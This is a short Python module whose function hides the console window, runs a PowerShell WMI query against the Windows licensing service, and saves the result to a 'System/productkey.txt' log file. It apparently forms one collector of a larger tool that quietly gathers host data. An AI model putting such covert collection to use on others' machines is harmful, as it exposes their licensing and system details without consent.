from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, check_output
from os.path import join
from manager.logger import Log
from preferences.config import config

def ProductKey():
    pathToLogs = join(config.pathToLogs, "System", "productkey.txt")
    try:
        startupinfo = STARTUPINFO()
        startupinfo.dwFlags |= STARTF_USESHOWWINDOW
        result = check_output(
            ['powershell', '-Command', 'Get-WmiObject -query "select * from SoftwareLicensingService"'],
            text=True,
            startupinfo=startupinfo
        ).strip().split("\n")

        items = []
        for item in result:
            stripped = [elem.strip() for elem in item.split(":")]
            items.append(": ".join(stripped))

        if not items: raise Exception("Failed to query WMI")

        with open(pathToLogs, "w", encoding="utf-8") as f:
            f.write("\n".join(items))

    except Exception as e:
        Log(f"ProductKey ---> {e}")
        return